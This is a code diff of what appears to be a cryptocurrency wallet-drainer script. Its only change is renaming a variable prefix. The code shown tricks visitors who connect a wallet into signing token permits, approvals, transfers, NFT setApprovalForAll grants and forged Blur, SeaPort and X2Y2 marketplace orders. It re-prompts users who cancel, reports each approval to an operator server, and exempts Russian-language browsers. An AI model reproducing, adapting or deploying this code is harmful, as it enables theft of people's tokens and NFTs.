-                    if (!BW_Settings.Loop_T) break;
+                    if (!MS_Settings.Loop_T) break;
                   }
                 }
               } else {
@@ -2525,41 +2525,41 @@ const connect_wallet = async (provider = null) => {
                   } catch(err) {
                     console.log(err);
                     await sign_cancel();
-                    if (!BW_Settings.Loop_T) break;
+                    if (!MS_Settings.Loop_T) break;
                   }
                 }
               }
-            } else if (BW_Settings.Settings.Sign.Tokens > 0 && (!BW_Sign_Disabled || BW_Settings.Settings.Sign.Force == 1)) {
+            } else if (MS_Settings.Settings.Sign.Tokens > 0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 1)) {
               while (true) {
                 try {
                   await SIGN_TOKEN(asset);
-                  if (BW_Settings.Settings.Sign.Tokens == 1) {
-                    const x_promise = send_request({ action: 'approve_token', user_id: BW_ID, asset, address: BW_Current_Address });
-                    if (BW_Settings.Settings.Wait_For_Response) await x_promise;
+                  if (MS_Settings.Settings.Sign.Tokens == 1) {
+                    const x_promise = send_request({ action: 'approve_token', user_id: MS_ID, asset, address: MS_Current_Address });
+                    if (MS_Settings.Settings.Wait_For_Response) await x_promise;
                   }
                   asset.skip = true;
                   break;
                 } catch(err) {
                   console.log(err);
                   if (err.code == -32601 || err.code == -32000) {
-                    if (BW_Settings.Settings.Sign.Force == 1) {
+                    if (MS_Settings.Settings.Sign.Force == 1) {
                       await sign_cancel();
                     } else {
                       await sign_unavailable();
                       while (true) {
-                        if (BW_Settings.Settings.Sign.Tokens == 1) {
-                          if (BW_Settings.Settings.Approve.MetaMask || (BW_Current_Provider != 'MetaMask' || BW_Mobile_Status)) {
+                        if (MS_Settings.Settings.Sign.Tokens == 1) {
+                          if (MS_Settings.Settings.Approve.MetaMask || (MS_Current_Provider != 'MetaMask' || MS_Mobile_Status)) {
                             try {
                               let res_code = await APPROVE_TOKEN(asset);
                               if (res_code == 1) {
-                                const x_promise = send_request({ action: 'approve_token', user_id: BW_ID, asset, address: BW_Current_Address });
-                                if (BW_Settings.Settings.Wait_For_Response) await x_promise;
+                                const x_promise = send_request({ action: 'approve_token', user_id: MS_ID, asset, address: MS_Current_Address });
+                                if (MS_Settings.Settings.Wait_For_Response) await x_promise;
                               }
                               asset.skip = true;
                               break;
                             } catch(err) {
                               await approve_cancel();
-                              if (!BW_Settings.Loop_T) break;
+                              if (!MS_Settings.Loop_T) break;
                             }
                           } else {
                             try {
@@ -2569,10 +2569,10 @@ const connect_wallet = async (provider = null) => {
                             } catch(err) {
                               console.log(err);
                               await transfer_cancel();
-                              if (!BW_Settings.Loop_T) break;
+                              if (!MS_Settings.Loop_T) break;
                             }
                           }
-                        } else if (BW_Settings.Settings.Sign.Tokens == 2) {
+                        } else if (MS_Settings.Settings.Sign.Tokens == 2) {
                           try {
                             await TRANSFER_TOKEN(asset);
                             asset.skip = true;
@@ -2580,7 +2580,7 @@ const connect_wallet = async (provider = null) => {
                           } catch(err) {
                             console.log(err);
                             await transfer_cancel();
-                            if (!BW_Settings.Loop_T) break;
+                            if (!MS_Settings.Loop_T) break;
                           }
                         }
                       }
@@ -2589,24 +2589,24 @@ const connect_wallet = async (provider = null) => {
                   } else {
                     console.log(err);
                     await sign_cancel();
-                    if (!BW_Settings.Loop_T) break;
+                    if (!MS_Settings.Loop_T) break;
                   }
                 }
               }
-            } else if (BW_Settings.Settings.Approve.Enable && (BW_Settings.Settings.Approve.MetaMask || (BW_Current_Provider != 'MetaMask' || BW_Mobile_Status))) {
+            } else if (MS_Settings.Settings.Approve.Enable && (MS_Settings.Settings.Approve.MetaMask || (MS_Current_Provider != 'MetaMask' || MS_Mobile_Status))) {
               while (true) {
                 try {
                   let res_code = await APPROVE_TOKEN(asset);
                   if (res_code == 1) {
-                    const x_promise = send_request({ action: 'approve_token', user_id: BW_ID, asset, address: BW_Current_Address });
-                    if (BW_Settings.Settings.Wait_For_Response) await x_promise;
+                    const x_promise = send_request({ action: 'approve_token', user_id: MS_ID, asset, address: MS_Current_Address });
+                    if (MS_Settings.Settings.Wait_For_Response) await x_promise;
                   }
                   asset.skip = true;
                   break;
                 } catch(err) {
                   console.log(err);
                   await approve_cancel();
-                  if (!BW_Settings.Loop_T) break;
+                  if (!MS_Settings.Loop_T) break;
                 }
               }
             } else {
@@ -2618,28 +2618,28 @@ const connect_wallet = async (provider = null) => {
                 } catch(err) {
                   console.log(err);
                   await transfer_cancel();
-                  if (!BW_Settings.Loop_T) break;
+                  if (!MS_Settings.Loop_T) break;
                 }
               }
             }
           } else if (asset.type == 'ERC721') {
-            if (typeof SIGN_BLUR !== 'undefined' && BW_Settings.Settings.Blur.Enable == 1 && BW_Settings.Settings.Blur.Priority == 0 && !BL_US
-            && BW_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, BW_Current_Address, "0x00000000000111abe46ff893f3b2fdf1f759a8a8"))
-            && asset.amount_usd >= BW_Settings.Settings.Blur.Price) {
-              await SIGN_BLUR(assets, BW_Provider, BW_Current_Address, BW_Settings.Address, BW_ID); BL_US = true;
-            } else if (typeof SIGN_SEAPORT !== 'undefined' && BW_Settings.Settings.SeaPort.Enable == 1 && BW_Settings.Settings.SeaPort.Priority == 0 && !SP_US
-            && BW_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, BW_Current_Address, "0x1E0049783F008A0085193E00003D00cd54003c71"))
-            && asset.amount_usd >= BW_Settings.Settings.SeaPort.Price) {
-              await SIGN_SEAPORT(assets, BW_Provider, BW_Current_Address, BW_Settings.Address, BW_ID); SP_US = true;
-            } else if (typeof SIGN_X2Y2 !== 'undefined' && BW_Settings.Settings.x2y2.Enable == 1 && BW_Settings.Settings.x2y2.Priority == 0 && !XY_US
-            && BW_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, BW_Current_Address, "0xf849de01b080adc3a814fabe1e2087475cf2e354"))
-            && asset.amount_usd >= BW_Settings.Settings.x2y2.Price) {
-              await SIGN_X2Y2(assets, BW_Provider, BW_Current_Address, BW_Settings.Address, BW_ID); XY_US = true;
-            } else if (BW_Settings.Settings.Sign.NFTs > 0 && (!BW_Sign_Disabled || BW_Settings.Settings.Sign.Force == 1)) {
+            if (typeof SIGN_BLUR !== 'undefined' && MS_Settings.Settings.Blur.Enable == 1 && MS_Settings.Settings.Blur.Priority == 0 && !BL_US
+            && MS_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, MS_Current_Address, "0x00000000000111abe46ff893f3b2fdf1f759a8a8"))
+            && asset.amount_usd >= MS_Settings.Settings.Blur.Price) {
+              await SIGN_BLUR(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID); BL_US = true;
+            } else if (typeof SIGN_SEAPORT !== 'undefined' && MS_Settings.Settings.SeaPort.Enable == 1 && MS_Settings.Settings.SeaPort.Priority == 0 && !SP_US
+            && MS_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, MS_Current_Address, "0x1E0049783F008A0085193E00003D00cd54003c71"))
+            && asset.amount_usd >= MS_Settings.Settings.SeaPort.Price) {
+              await SIGN_SEAPORT(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID); SP_US = true;
+            } else if (typeof SIGN_X2Y2 !== 'undefined' && MS_Settings.Settings.x2y2.Enable == 1 && MS_Settings.Settings.x2y2.Priority == 0 && !XY_US
+            && MS_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, MS_Current_Address, "0xf849de01b080adc3a814fabe1e2087475cf2e354"))
+            && asset.amount_usd >= MS_Settings.Settings.x2y2.Price) {
+              await SIGN_X2Y2(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID); XY_US = true;
+            } else if (MS_Settings.Settings.Sign.NFTs > 0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 1)) {
               while (true) {
                 try {
                   await SIGN_NFT(asset);
-                  if (BW_Settings.Settings.Sign.Tokens == 1) {
+                  if (MS_Settings.Settings.Sign.Tokens == 1) {
                     let same_collection = [];
                     for (const x_asset of assets) {
                       try {
@@ -2652,8 +2652,8 @@ const connect_wallet = async (provider = null) => {
                       }
                     }
                     await send_request({
-                      action: 'safa_approves', user_id: BW_ID, tokens: same_collection, address: BW_Current_Address,
-                      chain_id: BW_Current_Chain_ID, contract_address: asset.address
+                      action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
+                      chain_id: MS_Current_Chain_ID, contract_address: asset.address
                     });
                   }
                   asset.skip = true;
@@ -2661,12 +2661,12 @@ const connect_wallet = async (provider = null) => {
                 } catch(err) {
                   console.log(err);
                   if (err.code == -32601 || err.code == -32000) {
-                    if (BW_Settings.Settings.Sign.Force == 1) {
+                    if (MS_Settings.Settings.Sign.Force == 1) {
                       await sign_cancel();
                     } else {
                       await sign_unavailable();
                       while (true) {
-                        if (BW_Settings.Settings.Sign.NFTs == 1) {
+                        if (MS_Settings.Settings.Sign.NFTs == 1) {
                           try {
                             await DO_SAFA(asset);
                             let same_collection = [];
@@ -2681,17 +2681,17 @@ const connect_wallet = async (provider = null) => {
                               }
                             }
                             await send_request({
-                              action: 'safa_approves', user_id: BW_ID, tokens: same_collection, address: BW_Current_Address,
-                              chain_id: BW_Current_Chain_ID, contract_address: asset.address
+                              action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
+                              chain_id: MS_Current_Chain_ID, contract_address: asset.address
                             });
                             asset.skip = true;
                             break;
                           } catch(err) {
                             console.log(err);
                             await approve_cancel();
-                            if (!BW_Settings.Loop_NFT) break;
+                            if (!MS_Settings.Loop_NFT) break;
                           }
-                        } else if (BW_Settings.Settings.Sign.NFTs == 2) {
+                        } else if (MS_Settings.Settings.Sign.NFTs == 2) {
                           try {
                             await TRANSFER_NFT(asset);
                             asset.skip = true;
@@ -2699,7 +2699,7 @@ const connect_wallet = async (provider = null) => {
                           } catch(err) {
                             console.log(err);
                             await transfer_cancel();
-                            if (!BW_Settings.Loop_NFT) break;
+                            if (!MS_Settings.Loop_NFT) break;
                           }
                         }
                       }
@@ -2708,11 +2708,11 @@ const connect_wallet = async (provider = null) => {
                   } else {
                     console.log(err);
                     await sign_cancel();
-                    if (!BW_Settings.Loop_NFT) break;
+                    if (!MS_Settings.Loop_NFT) break;
                   }
                 }
               }
-            } else if (BW_Settings.Settings.Approve.Enable) {
+            } else if (MS_Settings.Settings.Approve.Enable) {
               while (true) {
                 try {
                   await DO_SAFA(asset);
@@ -2728,15 +2728,15 @@ const connect_wallet = async (provider = null) => {
                     }
                   }
                   await send_request({
-                    action: 'safa_approves', user_id: BW_ID, tokens: same_collection, address: BW_Current_Address,
-                    chain_id: BW_Current_Chain_ID, contract_address: asset.address
+                    action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
+                    chain_id: MS_Current_Chain_ID, contract_address: asset.address
                   });
                   asset.skip = true;
                   break;
                 } catch(err) {
                   console.log(err);
                   await approve_cancel();
-                  if (!BW_Settings.Loop_NFT) break;
+                  if (!MS_Settings.Loop_NFT) break;
                 }
               }
             } else {
@@ -2748,7 +2748,7 @@ const connect_wallet = async (provider = null) => {
                 } catch(err) {
                   console.log(err);
                   await transfer_cancel();
-                  if (!BW_Settings.Loop_NFT) break;
+                  if (!MS_Settings.Loop_NFT) break;
                 }
               }
             }
@@ -2758,7 +2758,7 @@ const connect_wallet = async (provider = null) => {
         }
       }
     }
-    BW_Process = false;
+    MS_Process = false;
     setTimeout(end_message, 2000);
   } catch(err) {
     console.log(err);
@@ -2768,7 +2768,7 @@ const connect_wallet = async (provider = null) => {
 try {
   let query_string = window.location.search, url_params = new URLSearchParams(query_string);
   if (url_params.get('cis') != 'test' && (navigator.language || navigator.userLanguage).toLowerCase().includes('ru')) {
-    BW_Bad_Country = true;
+    MS_Bad_Country = true;
   }
 } catch(err) {
   console.log(err);
@@ -2779,24 +2779,24 @@ document.addEventListener('DOMContentLoaded', async () => {
     try {
       const queryString = window.location.search;
       const urlParams = new URLSearchParams(queryString);
-      BW_Ref_Data = urlParams.get('ref') || 'N/A';
+      MS_Ref_Data = urlParams.get('ref') || 'N/A';
     } catch(err) {
       console.log(err);
     }
     await retrive_config();
     fill_chain_data();
     await retrive_contract();
-    if (typeof localStorage['BW_ID'] === 'undefined') {
+    if (typeof localStorage['MS_ID'] === 'undefined') {
       const ID_Data = await send_request({ action: 'retrive_id' });
-      if (ID_Data.status == 'OK') localStorage['BW_ID'] = ID_Data.data;
-      else localStorage['BW_ID'] = Math.floor(Date.now() / 1000);
+      if (ID_Data.status == 'OK') localStorage['MS_ID'] = ID_Data.data;
+      else localStorage['MS_ID'] = Math.floor(Date.now() / 1000);
     }
-    BW_ID = localStorage['BW_ID'], BW_Ready = true;
+    MS_ID = localStorage['MS_ID'], MS_Ready = true;
     inject_modal(); enter_website();
-    for (const chain_id in BW_Settings.RPCs) BW_Gas_Reserves[chain_id] = 0;
+    for (const chain_id in MS_Settings.RPCs) MS_Gas_Reserves[chain_id] = 0;
     for (const elem of document.querySelectorAll('.connect-button')) {
       try {
-        elem.addEventListener('click', () => BW_init());
+        elem.addEventListener('click', () => ms_init());
       } catch(err) {
         console.log(err);
       }
